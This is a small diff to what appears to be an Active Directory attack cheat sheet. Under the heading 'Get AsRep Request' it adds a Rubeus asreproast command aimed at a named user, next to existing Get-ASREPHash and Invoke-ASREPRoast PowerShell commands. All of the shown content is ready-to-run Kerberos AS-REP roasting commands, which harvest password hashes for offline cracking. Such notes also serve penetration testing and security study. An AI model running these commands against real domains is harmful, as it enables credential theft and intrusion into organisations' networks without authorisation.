@@ -32,7 +32,11 @@ __Get AsRep Request__
 ```powershell
 Get-ASREPHash -UserName VPN1user -Verbose
 ```
-•
+
+```powershell
+ .\Rubeus.exe asreproast /user:adunn /nowrap
+```
+
 ```powershell
 Invoke-ASREPRoast -Verbose
 ```
